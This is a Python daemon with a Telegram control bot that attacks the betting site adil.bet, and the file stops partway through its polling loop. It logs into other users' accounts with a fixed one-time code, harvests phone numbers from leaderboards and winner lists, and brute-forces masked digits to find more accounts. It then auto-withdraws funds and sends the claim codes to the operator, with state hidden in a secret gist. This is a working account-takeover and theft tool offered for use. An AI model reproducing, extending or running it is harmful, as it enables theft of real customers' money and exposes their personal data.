#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
adil_bot.py — 24/7 adil.bet harvest daemon + Telegram control bot

Runs four background workers non-stop and serves a Telegram bot:

  WORKERS
    1. rescan      — infinite full balance sweep of every known phone
    2. refund      — polls watchlist; when withdrawable >= threshold it
                     auto-initiates a BetConnect withdrawal, reads the claim
                     code straight from the payment gateway, and pushes it
                     to Telegram
    3. lb          — leaderboard brute (all tournament days, paginated)
    4. spin        — spin-wheel / top-winners harvest

  TELEGRAM COMMANDS
    /status            health + totals
    /top [n]           top n accounts by cached withdrawable (default 10)
    /avi [n]           mint Aviator launch links for top n
    /jetx [n]          mint JetX launch links for top n
    /withdraw <phone>  withdraw + return code immediately
    /codes             recently captured codes
    /watch             watchlist + threshold
    /add <phone>       add phone to watchlist
    /del <phone>       remove phone from watchlist
    /threshold <amt>   auto-withdraw threshold (default 5000)
    /rescan            restart the rescan worker
    /help

ENV
    ADIL_BOT_TOKEN   Telegram bot token (required)
    ADIL_CHAT_ID     optional: only serve this chat id
"""
import os, sys, io, json, time, math, threading, traceback
import requests, urllib3

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
urllib3.disable_warnings()

BASE = os.path.dirname(os.path.abspath(__file__))
STATE = os.path.join(BASE, 'state')
os.makedirs(STATE, exist_ok=True)
os.chdir(BASE)

# ---------------------------------------------------------------- config
# token can come from env OR state/config.json ({"bot_token": "..."})
def _bootstrap_token():
    t = os.environ.get('ADIL_BOT_TOKEN', '').strip()
    if t:
        return t
    try:
        with open(os.path.join(STATE, 'config.json')) as f:
            return (json.load(f).get('bot_token') or '').strip()
    except Exception:
        return ''


BOT_TOKEN = _bootstrap_token()
ALLOWED_CHAT = os.environ.get('ADIL_CHAT_ID', '').strip()

CONTROL_PHONE = '+251924904782'
OTP = '123456'
WD_MIN = 550.0          # withdrawable must be >= this
NET_MIN = 500           # net after 10% fee must be >= this
FEE = 1.1

H = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json',
     'Origin': 'https://adil.bet', 'X-Tenant-Origin': 'adil.bet'}
GATEWAY = 'https://zplayzone.com/api/gateway/pay/'
GATEWAY_H = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
             'Origin': 'https://zplayzone.com', 'Referer': 'https://zplayzone.com/'}

F_MASTER = os.path.join(STATE, 'master_phones.txt')
F_BAL = os.path.join(STATE, 'balances.json')
F_WATCH = os.path.join(STATE, 'watchlist.json')
F_CODES = os.path.join(STATE, 'codes.json')
F_CFG = os.path.join(STATE, 'config.json')
F_MASK = os.path.join(STATE, 'mask_targets.json')
F_MASKFOUND = os.path.join(STATE, 'mask_found.json')

_lock = threading.RLock()
_stats = {'rescan_done': 0, 'rescan_total': 0, 'rescan_cycle': 0,
          'refund_cycle': 0, 'lb_cycle': 0, 'spin_cycle': 0,
          'mask_cycle': 0, 'mask_checked': 0, 'mask_masks_done': 0,
          'last_error': '', 'started': time.time()}
_tokens = {}

# top-winner mask cracking: phone is 251 + 6 unknown digits + last3 visible
# first digit of the 9-digit national number is 9 (Ethio Telecom) or 7 (Safaricom)
MASK_THREADS = int(os.environ.get('ADIL_MASK_THREADS', '4'))


def log(msg):
    line = '[%s] %s' % (time.strftime('%H:%M:%S'), msg)
    print(line, flush=True)
    try:
        with open(os.path.join(BASE, 'adil_bot.log'), 'a') as f:
            f.write(line + '\n')
    except Exception:
        pass


# ---------------------------------------------------------------- state io
def jload(path, default):
    try:
        with open(path) as f:
            return json.load(f)
    except Exception:
        return default


def jsave(path, obj):
    tmp = path + '.tmp'
    with open(tmp, 'w') as f:
        json.dump(obj, f)
    os.replace(tmp, path)


GIST_ID = os.environ.get('ADIL_GIST_ID', '').strip()
GIST_TOKEN = os.environ.get('ADIL_GIST_TOKEN', '').strip()
_GIST_FILES = ['master_phones.txt', 'balances.json', 'watchlist.json',
               'mask_targets.json', 'mask_found.json', 'top_live.json', 'codes.json']


def _gist_headers():
    t = GIST_TOKEN or os.environ.get('GITHUB_TOKEN', '').strip()
    return {'Authorization': 'Bearer ' + t, 'Accept': 'application/vnd.github+json',
            'User-Agent': 'adil'} if t else {}


def gist_pull():
    """Restore state files from the secret gist (public repo stays clean)."""
    if not GIST_ID:
        return 0
    H_ = _gist_headers()
    if 'Authorization' not in H_:
        return 0
    try:
        r = requests.get('https://api.github.com/gists/' + GIST_ID, headers=H_, timeout=40, verify=False)
        if r.status_code != 200:
            log('gist_pull failed %s' % r.status_code)
            return 0
        got = 0
        for name, meta in (r.json().get('files') or {}).items():
            if name not in _GIST_FILES:
                continue
            try:
                content = meta.get('content')
                if content is None and meta.get('raw_url'):
                    content = requests.get(meta['raw_url'], headers=H_, timeout=40, verify=False).text
                if content:
                    with open(os.path.join(STATE, name), 'w', encoding='utf-8') as f:
                        f.write(content)
                    got += 1
            except Exception:
                pass
        log('gist_pull: restored %d state file(s)' % got)
        return got
    except Exception:
        log('gist_pull error: ' + traceback.format_exc()[-120:])
        return 0


def gist_push():
    """Persist state files back to the secret gist."""
    if not GIST_ID:
        return False
    H_ = _gist_headers()
    if 'Authorization' not in H_:
        return False
    files = {}
    for name in _GIST_FILES:
        p = os.path.join(STATE, name)
        if not os.path.exists(p):
            continue
        try:
            c = open(p, encoding='utf-8').read()
            if len(c) > 900000:      # gist per-file soft limit
                c = c[:900000]
            files[name] = {'content': c}
        except Exception:
            pass
    if not files:
        return False
    try:
        r = requests.patch('https://api.github.com/gists/' + GIST_ID, headers=H_,
                           json={'files': files}, timeout=60, verify=False)
        ok = r.status_code in (200, 201)
        log('gist_push: %s (%d files)' % ('ok' if ok else r.status_code, len(files)))
        return ok
    except Exception:
        log('gist_push error: ' + traceback.format_exc()[-120:])
        return False


def load_master():
    try:
        with open(F_MASTER) as f:
            return [ln.strip().lstrip('+') for ln in f if ln.strip().isdigit()]
    except Exception:
        return []


def append_master(nums):
    if not nums:
        return
    with open(F_MASTER, 'a') as f:
        for n in nums:
            f.write(n + '\n')


def cfg():
    d = jload(F_CFG, {})
    d.setdefault('threshold', 5000.0)
    return d


def set_cfg(**kw):
    d = cfg()
    d.update(kw)
    jsave(F_CFG, d)
    return d


# ---------------------------------------------------------------- adil api
def login(phone=CONTROL_PHONE, tries=6):
    for _ in range(tries):
        try:
            r = requests.post('https://adil.bet/api/v1/auth/verify-otp',
                              json={'phone': phone, 'otp': OTP},
                              headers=H, timeout=20, verify=False)
            if r.status_code == 200:
                tok = r.json()['data']['access_token']
                _tokens[phone] = tok
                return {'Authorization': 'Bearer ' + tok, **H}
            if r.status_code == 429:
                time.sleep(8)
                continue
        except Exception:
            time.sleep(4)
    return None


def auth_for(phone):
    phone = phone if phone.startswith('+') else '+' + phone
    for _ in range(5):
        try:
            r = requests.post('https://adil.bet/api/v1/auth/verify-otp',
                              json={'phone': phone, 'otp': OTP},
                              headers=H, timeout=15, verify=False)
            if r.status_code == 200:
                return {'Authorization': 'Bearer ' + r.json()['data']['access_token'], **H}
            if r.status_code == 429:
                time.sleep(6)
                continue
            return None
        except Exception:
            time.sleep(3)
    return None


def balance(A):
    try:
        w = requests.get('https://adil.bet/api/v1/wallet/balance', headers=A,
                         timeout=15, verify=False).json()
        w = (w.get('data') or {}).get('wallet') or {}
        return float(w.get('withdrawable') or 0), float(w.get('locked_balance') or 0), w
    except Exception:
        return None, None, {}


def exists(A, phone):
    """True if account exists (verify-otp 200)."""
    try:
        r = requests.post('https://adil.bet/api/v1/auth/verify-otp',
                          json={'phone': '+' + phone, 'otp': OTP},
                          headers=H, timeout=12, verify=False)
        return r.status_code == 200
    except Exception:
        return None


def launch_url(A, game_id):
    for _ in range(4):
        try:
            r = requests.post('https://adil.bet/api/v1/casino/launch',
                              json={'game_id': game_id, 'mode': 'real'},
                              headers=A, timeout=25, verify=False)
            d = r.json()
            if d.get('success'):
                return d['data'].get('url')
            return None
        except Exception:
            time.sleep(3)
    return None


def claim_code_from_gateway(token):
    """Read the withdrawal claim code straight from the payment gateway."""
    for _ in range(6):
        try:
            r = requests.get(GATEWAY + token, headers=GATEWAY_H, timeout=15, verify=False)
            if r.status_code == 200:
                d = r.json()
                cc = d.get('claimCode')
                if cc:
                    cc = cc.strip()
                    if '-' not in cc and len(cc) >= 6:
                        cc = cc[:3] + '-' + cc[3:]
                    return cc, d
                return None, d
        except Exception:
            pass
        time.sleep(3)
    return None, {}


def withdraw(phone, amount=None):
    """Initiate BetConnect withdrawal and return (code, detail)."""
    A = auth_for(phone)
    if not A:
        return None, {'error': 'auth failed'}
    wd, lk, raw = balance(A)
    if wd is None:
        return None, {'error': 'balance read failed'}
    if wd < WD_MIN:
        return None, {'error': 'withdrawable %.2f below minimum %.0f' % (wd, WD_MIN), 'wd': wd}
    amt = amount or int(math.floor(wd / FEE))
    if amt < NET_MIN:
        return None, {'error': 'net %d below %d' % (amt, NET_MIN), 'wd': wd}
    for _ in range(4):
        try:
            r = requests.post('https://adil.bet/api/v1/wallet/betconnect/initiate-withdrawal',
                              json={'amount': amt, 'phone': '+' + phone.lstrip('+')},
                              headers=A, timeout=30, verify=False)
            d = r.json()
            if d.get('success'):
                dd = d['data']
                tok = dd.get('checkout_token')
                code, gd = claim_code_from_gateway(tok)
                rec = {'phone': phone.lstrip('+'), 'amount': amt, 'wd_at': wd,
                       'code': code, 'checkout_url': dd.get('checkout_url'),
                       'token': tok, 'status': gd.get('status'),
                       'agent': gd.get('agentName'), 'agent_code': gd.get('agentCode'),
                       'ts': time.strftime('%Y-%m-%dT%H:%M:%S')}
                with _lock:
                    codes = jload(F_CODES, [])
                    codes.insert(0, rec)
                    jsave(F_CODES, codes[:200])
                return code, rec
            if 'below minimum' in str(d):
                return None, {'error': 'below minimum (server)', 'resp': str(d)[:200]}
            time.sleep(4)
        except Exception as e:
            time.sleep(4)
    return None, {'error': 'initiate failed'}


# ---------------------------------------------------------------- worker: rescan
# ---------------------------------------------------------------- worker: rescan
def _maybe_capture(ph, wd, A2, source):
    """Auto-withdraw + push the code the moment a fat account is seen."""
    c = cfg()
    thr = float(c.get('threshold', 5000.0))
    any_mode = bool(c.get('auto_withdraw_any', False))
    hit_min = WD_MIN if any_mode else thr
    if wd is None or wd < hit_min:
        return False
    if ph in set(jload(F_CODES, []) and [x.get('phone') for x in jload(F_CODES, [])] or []):
        pass
    log('AUTO-CAPTURE %s wd=%.2f (source=%s)' % (ph, wd, source))
    code, rec = withdraw(ph)
    if code:
        tg_send('🎯 <b>CAPTURED</b> (%s)\n+%s\nwithdrawable %.2f\nnet %s\n'
                '<b>CODE: %s</b>\nagent: %s'
                % (source, ph, wd, (rec or {}).get('amount'), code,
                   (rec or {}).get('agent') or 'unassigned'))
    else:
        tg_send('⚠️ capture failed (%s)\n+%s wd=%.2f\n%s'
                % (source, ph, wd, json.dumps(rec)[:200]))
    return bool(code)


def rescan_worker():
    """Endless sweep: the next cycle starts the instant the previous ends."""
    cycle = 0
    while True:
        cycle += 1
        try:
            A = login()
            if not A:
                log('rescan: login failed')
                time.sleep(30)
                continue
            phones = load_master()
            with _lock:
                _stats['rescan_total'] = len(phones)
                _stats['rescan_done'] = 0
                _stats['rescan_cycle'] = cycle
            log('rescan cycle %d: %d phones' % (cycle, len(phones)))
            prev = jload(F_BAL, {})
            fresh = {}
            done = 0
            for ph in phones:
                try:
                    r = requests.post('https://adil.bet/api/v1/auth/verify-otp',
                                      json={'phone': '+' + ph, 'otp': OTP},
                                      headers=H, timeout=10, verify=False)
                    if r.status_code == 429:
                        time.sleep(1.5)
                        continue
                    if r.status_code == 200:
                        A2 = {'Authorization': 'Bearer ' + r.json()['data']['access_token'], **H}
                        wd, lk, raw = balance(A2)
                        if wd is not None and (wd > 0 or lk > 0):
                            fresh[ph] = {'wd': round(wd, 2), 'locked': round(lk, 2),
                                         'bal': round(float(raw.get('balance') or 0), 2)}
                            # ---- instant capture the moment it qualifies ----
                            _maybe_capture(ph, wd, A2, 'rescan')
                except Exception:
                    pass
                done += 1
                # keep /top fresh: persist every 5 accounts
                if done % 5 == 0:
                    with _lock:
                        _stats['rescan_done'] = done
                        jsave(F_BAL, {**prev, **fresh})   # never blank out the cache
                time.sleep(0.03)
            with _lock:
                _stats['rescan_done'] = done
                jsave(F_BAL, fresh)
            log('rescan cycle %d done: %d funded — restarting immediately'
                % (cycle, len(fresh)))
            # no sleep: next cycle starts now
        except Exception:
            _stats['last_error'] = traceback.format_exc()[-300:]
            log('rescan error: ' + _stats['last_error'][-150:])
            time.sleep(10)


# ---------------------------------------------------------------- worker: live top
def toplive_worker():
    """Refresh the live top-N balances every TOP_REFRESH seconds.

    Writes state/top_live.json (used by /top) and auto-captures anything that
    crosses the threshold between rescans.
    """
    refresh = int(os.environ.get('ADIL_TOP_REFRESH', '5'))
    n = int(os.environ.get('ADIL_TOP_N', '15'))
    while True:
        try:
            A = login()
            if not A:
                time.sleep(15)
                continue
            bal = jload(F_BAL, {})
            cand = [p for p, v in sorted(bal.items(),
                                         key=lambda kv: -(kv[1].get('wd') or 0))[:n]]
            live = []
            for ph in cand:
                A2 = auth_for(ph)
                if not A2:
                    continue
                wd, lk, raw = balance(A2)
                if wd is None:
                    continue
                live.append({'phone': ph, 'wd': round(wd, 2), 'locked': round(lk or 0, 2)})
                if wd >= float(cfg().get('threshold', 5000.0)) or \
                   (cfg().get('auto_withdraw_any') and wd >= WD_MIN):
                    _maybe_capture(ph, wd, A2, 'toplive')
                time.sleep(0.15)
            live.sort(key=lambda x: -x['wd'])
            with _lock:
                jsave(os.path.join(STATE, 'top_live.json'),
                      {'ts': time.strftime('%Y-%m-%dT%H:%M:%S'), 'items': live})
                # keep balances.json in sync with the fresh numbers
                b2 = jload(F_BAL, {})
                for it in live:
                    b2.setdefault(it['phone'], {})
                    b2[it['phone']]['wd'] = it['wd']
                    b2[it['phone']]['locked'] = it['locked']
                jsave(F_BAL, b2)
        except Exception:
            log('toplive error: ' + traceback.format_exc()[-120:])
        time.sleep(max(1, refresh))


# ---------------------------------------------------------------- worker: refund
def refund_worker():
    cycle = 0
    while True:
        cycle += 1
        try:
            A = login()
            if not A:
                time.sleep(60)
                continue
            watch = jload(F_WATCH, [])
            thr = float(cfg().get('threshold', 5000.0))
            with _lock:
                _stats['refund_cycle'] = cycle
            hits = []
            for ph in list(watch):
                try:
                    r = requests.post('https://adil.bet/api/v1/auth/verify-otp',
                                      json={'phone': '+' + ph, 'otp': OTP},
                                      headers=H, timeout=10, verify=False)
                    if r.status_code != 200:
                        continue
                    A2 = {'Authorization': 'Bearer ' + r.json()['data']['access_token'], **H}
                    wd, lk, raw = balance(A2)
                    if wd is None:
                        continue
                    if wd >= thr:
                        log('REFUND HIT %s wd=%.2f -> withdrawing' % (ph, wd))
                        code, rec = withdraw(ph)
                        hits.append((ph, wd, code, rec))
                        tg_send('🎯 <b>REFUND CAPTURED</b>\n'
                                '+%s\nwithdrawable: %.2f\nnet: %s\n<b>CODE: %s</b>\nagent: %s'
                                % (ph, wd, (rec or {}).get('amount'),
                                   code or 'FAILED', (rec or {}).get('agent') or 'unassigned'))
                except Exception:
                    pass
                time.sleep(0.2)
            log('refund cycle %d: %d watched, %d hits' % (cycle, len(watch), len(hits)))
        except Exception:
            log('refund error: ' + traceback.format_exc()[-150:])
        time.sleep(120)


# ---------------------------------------------------------------- worker: leaderboard
def lb_worker():
    cycle = 0
    rotate = 1
    known = [13, 20, 21, 27]
    while True:
        cycle += 1
        try:
            A = login()
            if not A:
                time.sleep(60)
                continue
            with _lock:
                _stats['lb_cycle'] = cycle
            master = set(load_master())
            probe = list(known)
            i = rotate
            while len(probe) < len(known) + 15:
                if i > 300:
                    i = 1
                if i not in probe:
                    probe.append(i)
                i += 1
            rotate = i
            new = []
            for tid in probe:
                try:
                    dj = requests.get('https://adil.bet/api/v1/tournaments/%d/days' % tid,
                                      headers=A, timeout=8, verify=False)
                    if dj.status_code != 200:
                        continue
                    days = (dj.json().get('data') or [])
                    for d in days:
                        did = d.get('id')
                        if not did:
                            continue
                        off = 0
                        while True:
                            lr = requests.get(
                                'https://adil.bet/api/v1/tournaments/%d/days/%s/leaderboard?limit=100&offset=%d'
                                % (tid, did, off), headers=A, timeout=12, verify=False)
                            if lr.status_code != 200:
                                break
                            dd = lr.json().get('data') or {}
                            rows = dd.get('rows') or []
                            if not rows:
                                break
                            for it in rows:
                                ph = it.get('phone')
                                if not ph:
                                    continue
                                ph = str(ph).lstrip('+')
                                if ph.isdigit() and len(ph) >= 12 and ph not in master:
                                    master.add(ph)
                                    new.append(ph)
                            tot = dd.get('total')
                            off += 100
                            if (tot is not None and off >= int(tot)) or len(rows) < 100:
                                break
                except Exception:
                    pass
            if new:
                append_master(new)
                log('lb cycle %d: +%d new phones' % (cycle, len(new)))
                tg_send('📥 <b>Leaderboard</b>: +%d new numbers (master %d)'
                        % (len(new), len(master)))
            else:
                log('lb cycle %d: no new' % cycle)
        except Exception:
            log('lb error: ' + traceback.format_exc()[-150:])
        time.sleep(120)


# ---------------------------------------------------------------- worker: spin
def spin_worker():
    cycle = 0
    while True:
        cycle += 1
        try:
            A = login()
            if not A:
                time.sleep(60)
                continue
            with _lock:
                _stats['spin_cycle'] = cycle
            master = set(load_master())
            new = []
            for ep in ['/api/v1/spin-wheel/recent-wins?limit=20',
                       '/api/v1/casino/top-winners?limit=20']:
                try:
                    r = requests.get('https://adil.bet' + ep, headers=A, timeout=12, verify=False)
                    if r.status_code != 200:
                        continue
                    d = r.json().get('data')
                    items = d if isinstance(d, list) else (d or {}).get('items') or (d or {}).get('rows') or []
                    for it in items:
                        if not isinstance(it, dict):
                            continue
                        ph = it.get('phone') or it.get('user_phone')
                        if not ph:
                            continue
                        ph = str(ph).lstrip('+')
                        if ph.isdigit() and len(ph) >= 12 and ph not in master:
                            master.add(ph)
                            new.append(ph)
                except Exception:
                    pass
            if new:
                append_master(new)
                log('spin cycle %d: +%d new' % (cycle, len(new)))
        except Exception:
            log('spin error: ' + traceback.format_exc()[-150:])
        time.sleep(60)


# ---------------------------------------------------------------- telegram
def tg(method, **payload):
    global BOT_TOKEN
    if not BOT_TOKEN:
        BOT_TOKEN = _bootstrap_token()
    if not BOT_TOKEN:
        return None
    try:
        r = requests.post('https://api.telegram.org/bot%s/%s' % (BOT_TOKEN, method),
                          json=payload, timeout=35, verify=False)
        return r.json()
    except Exception:
        return None


def _target_chat(chat_id=None):
    """Single source of truth: ALLOWED_CHAT always wins (lock-down)."""
    if ALLOWED_CHAT:
        return ALLOWED_CHAT
    return chat_id or cfg().get('chat_id')


def tg_send(text, chat_id=None):
    cid = _target_chat(chat_id)
    if not cid:
        return
    tg('sendMessage', chat_id=cid, text=text, parse_mode='HTML',
       disable_web_page_preview=True)


def tg_send_kb(text, buttons, chat_id=None):
    """buttons: list of (label, url) -> inline URL keyboard (opens directly)."""
    cid = _target_chat(chat_id)
    if not cid:
        return
    kb = {'inline_keyboard': [[{'text': lbl, 'url': url}] for lbl, url in buttons]}
    tg('sendMessage', chat_id=cid, text=text, parse_mode='HTML',
       disable_web_page_preview=True, reply_markup=kb)


# ---------------------------------------------------------------- worker: mask cracker
def mask_targets_from_topwinners(A):
    """Fetch top-winners and collect unique phone masks (last 3 digits)."""
    masks = []
    for ep in ['/api/v1/casino/top-winners?limit=50', '/api/v1/spin-wheel/recent-wins?limit=50']:
        try:
            r = requests.get('https://adil.bet' + ep, headers=A, timeout=15, verify=False)
            if r.status_code != 200:
                continue
            d = r.json().get('data') or {}
            items = d if isinstance(d, list) else (d.get('items') or d.get('rows') or [])
            for it in items:
                if not isinstance(it, dict):
                    continue
                pm = it.get('phone_masked') or it.get('phone') or ''
                pm = str(pm).lstrip('+')
                if len(pm) >= 3 and pm[-3:].isdigit():
                    m = {'last3': pm[-3:], 'win': it.get('amount') or it.get('bet_amount') or 0,
                         'game': it.get('game_name') or it.get('game') or ''}
                    if m['last3'] not in [x['last3'] for x in masks]:
                        masks.append(m)
        except Exception:
            pass
    return masks


def mask_worker():
    """Crack masked top-winner phone numbers (brute the 6 hidden digits)."""
    import queue
    cycle = 0
    while True:
        cycle += 1
        try:
            A = login()
            if not A:
                time.sleep(60)
                continue
            with _lock:
                _stats['mask_cycle'] = cycle
            # refresh target list
            fresh = mask_targets_from_topwinners(A)
            state = jload(F_MASK, {'done': [], 'pending': []})
            done_set = set(state.get('done') or [])
            pend = [m for m in (state.get('pending') or []) if m.get('last3') not in done_set]
            have = {m['last3'] for m in pend}
            for m in fresh:
                if m['last3'] not in done_set and m['last3'] not in have:
                    pend.append(m)
                    have.add(m['last3'])
            state['pending'] = pend
            jsave(F_MASK, state)

            if not pend:
                log('mask cycle %d: no pending masks' % cycle)
                time.sleep(180)
                continue

            master = set(load_master())
            found_all = jload(F_MASKFOUND, [])
            target = pend[0]
            l3 = target['last3']
            log('mask cycle %d: cracking last3=%s (pending %d)' % (cycle, l3, len(pend)))

            q = queue.Queue()
            for d1 in ('9', '7'):
                for mid in range(100000):
                    q.put('251' + d1 + '%05d' % mid + l3)

            found = []
            checked = [0]
            flock = threading.Lock()

            def _w():
                while True:
                    try:
                        ph = q.get_nowait()
                    except queue.Empty:
                        return
                    try:
                        r = requests.post('https://adil.bet/api/v1/auth/verify-otp',
                                          json={'phone': '+' + ph, 'otp': OTP},
                                          headers=H, timeout=8, verify=False)
                        if r.status_code == 200:
                            with flock:
                                found.append(ph)
                                found_all.append(ph)
                                master.add(ph)
                                jsave(F_MASKFOUND, found_all[-500:])
                                append_master([ph])
                            log('mask EXISTS +%s (last3=%s)' % (ph, l3))
                            tg_send('🔓 <b>mask crack hit</b>\n+%s\n(last3=%s, %s)'
                                    % (ph, l3, target.get('game') or ''))
                        elif r.status_code == 429:
                            time.sleep(1.2)
                            q.put(ph)
                    except Exception:
                        pass
                    with flock:
                        checked[0] += 1
                        if checked[0] % 200 == 0:
                            _stats['mask_checked'] = checked[0]
                    time.sleep(0.01)

            ths = [threading.Thread(target=_w, daemon=True) for _ in range(MASK_THREADS)]
            for t in ths:
                t.start()
            for t in ths:
                t.join()

            state = jload(F_MASK, {'done': [], 'pending': []})
            state.setdefault('done', []).append(l3)
            state['pending'] = [m for m in (state.get('pending') or []) if m.get('last3') != l3]
            jsave(F_MASK, state)
            with _lock:
                _stats['mask_masks_done'] = len(state.get('done') or [])
            log('mask last3=%s done: %d accounts found' % (l3, len(found)))
            if found:
                tg_send('✅ mask last3=%s complete — %d accounts found, added to master'
                        % (l3, len(found)))
        except Exception:
            log('mask error: ' + traceback.format_exc()[-200:])
            time.sleep(60)


def top_n(n):
    """Prefer the 5-second live snapshot; fall back to the rescan cache."""
    live = jload(os.path.join(STATE, 'top_live.json'), None)
    if live and live.get('items'):
        return [(it['phone'], {'wd': it['wd'], 'locked': it['locked']}) for it in live['items']][:n]
    bal = jload(F_BAL, {})
    items = sorted(bal.items(), key=lambda kv: -(kv[1].get('wd') or 0))
    return items[:n]


def fmt_top(n):
    items = top_n(n)
    if not items:
        return 'no balance data yet (rescan still running)'
    lines = []
    for i, (ph, v) in enumerate(items, 1):
        wd = v.get('wd') or 0
        mark = ' ✅' if wd >= WD_MIN else ''
        lines.append('%d. +%s — %.2f wd (net %d)%s' % (i, ph, wd, int(wd / FEE), mark))
    return '\n'.join(lines)


def handle_command(text, chat_id):
    parts = text.strip().split()
    if not parts:
        return
    cmd = parts[0].lower().lstrip('/')
    args = parts[1:]

    if cmd in ('start', 'help'):
        tg_send('<b>adil 24/7 bot</b>\n'
                '/status — health &amp; totals\n'
                '/top [n] — top balances + <b>Aviator link buttons</b>\n'
                '/avi [n] — plain Aviator links\n'
                '/jetx [n] — JetX links\n'
                '/withdraw &lt;phone&gt; — withdraw + code\n'
                '/codes — recent codes\n'
                '/mask — mask cracker status\n'
                '/watch — watchlist + threshold\n'
                '/add &lt;phone&gt; · /del &lt;phone&gt;\n'
                '/threshold &lt;amt&gt;\n'
                '/rescan — restart sweep\n', chat_id)
        return

    if cmd == 'status':
        bal = jload(F_BAL, {})
        pool = sum(v.get('wd') or 0 for v in bal.values())
        whales = [p for p, v in bal.items() if (v.get('wd') or 0) >= WD_MIN]
        up = int(time.time() - _stats['started'])
        tg_send('<b>STATUS</b>\n'
                'uptime: %dh %dm\n'
                'master phones: %d\n'
                'funded tracked: %d\n'
                'pool withdrawable: %.2f\n'
                'whales (>=%.0f): %d\n'
                'rescan: cycle %d, %d/%d\n'
                'refund: cycle %d (thr %.0f)\n'
                'lb: cycle %d\nspin: cycle %d\nmask: cycle %d (%d found)\n'
                'watchlist: %d'
                % (up // 3600, (up % 3600) // 60, len(load_master()), len(bal), pool,
                   WD_MIN, len(whales), _stats['rescan_cycle'], _stats['rescan_done'],
                   _stats['rescan_total'], _stats['refund_cycle'],
                   float(cfg().get('threshold', 5000)), _stats['lb_cycle'],
                   _stats['spin_cycle'], _stats['mask_cycle'],
                   len(jload(F_MASKFOUND, [])), len(jload(F_WATCH, []))), chat_id)
        return

    if cmd == 'top':
        n = int(args[0]) if args and args[0].isdigit() else 10
        items = [x for x in top_n(max(n * 3, 20)) if (x[1].get('wd') or 0) > 0][:n]
        if not items:
            tg_send('no funded accounts in cache yet (rescan running)', chat_id)
            return
        tg_send('building %d Aviator links…' % len(items), chat_id)
        buttons = []
        lines = []
        for i, (ph, v) in enumerate(items, 1):
            wd = v.get('wd') or 0
            A = auth_for(ph)
            u = launch_url(A, '183839') if A else None
            mark = ' ✅' if wd >= WD_MIN else ''
            lines.append('%d. +%s — %.2f wd (net %d)%s'
                         % (i, ph, wd, int(wd / FEE), mark))
            if u:
                buttons.append(('▶ %d. +%s  %.0f wd' % (i, ph[-6:], wd), u))
            time.sleep(0.8)
        head = '<b>TOP %d — tap to open Aviator</b>\n' % len(items)
        if buttons:
            tg_send_kb(head + '\n'.join(lines) + '\n\n(links are single-use, ~90s)', buttons, chat_id)
        else:
            tg_send(head + '\n'.join(lines) + '\n\n(no links could be minted)', chat_id)
        return

    if cmd in ('avi', 'jetx', 'open'):
        n = int(args[0]) if args and args[0].isdigit() else 5
        game = '184537' if cmd == 'jetx' else '183839'
        items = top_n(n)
        if not items:
            tg_send('no balance data yet', chat_id)
            return
        tg_send('minting %d %s links…' % (len(items), 'JetX' if cmd == 'jetx' else 'Aviator'), chat_id)
        out = []
        for ph, v in items:
            A = auth_for(ph)
            if not A:
                out.append('+%s — auth failed' % ph)
                continue
            wd, lk, _ = balance(A)
            u = launch_url(A, game)
            out.append('+%s (wd %.2f)\n%s' % (ph, wd or 0, u or 'launch failed'))
            time.sleep(1.2)
        tg_send('<b>%s LINKS</b>\n\n%s' % ('JETX' if cmd == 'jetx' else 'AVIATOR',
                                           '\n\n'.join(out)), chat_id)
        return

    if cmd == 'withdraw':
        if not args:
            tg_send('usage: /withdraw <phone>', chat_id)
            return
        ph = args[0].lstrip('+')
        tg_send('withdrawing +%s …' % ph, chat_id)
        code, rec = withdraw(ph)
        if code:
            tg_send('✅ <b>CODE: %s</b>\n+%s\nnet %s\nagent: %s\n\n'
                    'Redeem with YOUR agent (do not share publicly).'
                    % (code, ph, rec.get('amount'), rec.get('agent') or 'unassigned'), chat_id)
        else:
            tg_send('❌ failed: %s' % json.dumps(rec)[:300], chat_id)
        return

    if cmd == 'codes':
        codes = jload(F_CODES, [])[:10]
        if not codes:
            tg_send('no codes yet', chat_id)
            return
        out = []
        for c in codes:
            out.append('+%s  net %s  <b>%s</b>  %s  agent=%s'
                       % (c.get('phone'), c.get('amount'), c.get('code') or '?',
                          c.get('ts', '')[5:16], c.get('agent') or '-'))
        tg_send('<b>RECENT CODES</b>\n' + '\n'.join(out), chat_id)
        return

    if cmd == 'mask':
        st = jload(F_MASK, {'done': [], 'pending': []})
        found = jload(F_MASKFOUND, [])
        tg_send('<b>MASK CRACKER</b>\n'
                'cycle: %d\nchecked this mask: %d\nmasks done: %d\npending: %d\n'
                'accounts found: %d\n\nfound:\n%s'
                % (_stats['mask_cycle'], _stats['mask_checked'],
                   len(st.get('done') or []), len(st.get('pending') or []),
                   len(found), ', '.join('+' + p for p in found[-15:]) or '-'), chat_id)
        return

    if cmd == 'watch':
        w = jload(F_WATCH, [])
        tg_send('<b>WATCHLIST</b> (%d)  threshold %.0f\n%s'
                % (len(w), float(cfg().get('threshold', 5000)),
                   ', '.join('+' + p for p in w[:40]) + (' …' if len(w) > 40 else '')), chat_id)
        return

    if cmd in ('add', 'del'):
        if not args:
            tg_send('usage: /%s <phone>' % cmd, chat_id)
            return
        ph = args[0].lstrip('+')
        w = jload(F_WATCH, [])
        if cmd == 'add':
            if ph not in w:
                w.append(ph)
            msg = 'added +%s' % ph
        else:
            w = [x for x in w if x != ph]
            msg = 'removed +%s' % ph
        jsave(F_WATCH, w)
        tg_send('%s (watchlist now %d)' % (msg, len(w)), chat_id)
        return

    if cmd == 'threshold':
        if not args:
            tg_send('threshold = %.0f' % float(cfg().get('threshold', 5000)), chat_id)
            return
        try:
            v = float(args[0])
            set_cfg(threshold=v)
            tg_send('threshold set to %.0f' % v, chat_id)
        except Exception:
            tg_send('usage: /threshold 5000', chat_id)
        return

    if cmd == 'rescan':
        tg_send('rescan worker is always-on; restarting sweep cycle', chat_id)
        with _lock:
            _stats['rescan_done'] = 0
        return

    tg_send('unknown command. /help', chat_id)


def tg_poll():
    global BOT_TOKEN
    while not BOT_TOKEN:
        BOT_TOKEN = _bootstrap_token()
        if not BOT_TOKEN:
            log('waiting for bot token in state/config.json ...')
            time.sleep(30)
    log('telegram polling started')
    offset = None
    while True:
        try:
            payload = {'timeout': 30}
            if offset:
                payload['offset'] = offset
            r = requests.get('https://api.telegram.org/bot%s/getUpdates' % BOT_TOKEN,
                             params=payload, timeout=40, verify=False)
            j = r.json()
